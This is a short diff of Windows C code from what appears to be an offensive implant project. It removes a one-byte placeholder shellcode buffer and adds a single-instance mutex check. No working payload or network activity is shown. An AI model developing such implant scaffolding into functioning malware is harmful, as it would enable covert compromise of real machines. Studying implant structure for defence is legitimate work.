@@ -1,8 +1,5 @@
 #include "implant.h"
-#include "mutex.h"
 #include "config.h"
-
-unsigned char buf[] = "\x90";
 
 int APIENTRY WinMain(_In_ HINSTANCE hInst,
 	_In_opt_ HINSTANCE hPrevInstance,
@@ -27,3 +24,25 @@ int APIENTRY WinMain(_In_ HINSTANCE hInst,
 }
 
 
+unsigned int MutexCheck(const char *name) {
+	HANDLE mutex = NULL, error = NULL;
+
+	mutex = CreateMutex(NULL, TRUE, name);
+	if (mutex == NULL) {
+		// Error creating the mutex. This could be because
+		// we are trying to create a Global mutex and it exists
+		// already.
+		return FALSE;
+	}
+	else {
+		// Handle has been returned
+		error = (HANDLE)GetLastError();
+		if (error == (HANDLE)ERROR_ALREADY_EXISTS) {
+			// Mutex already exists
+			return FALSE;
+		}
+		else {
+			return TRUE;
+		}
+	}
+}
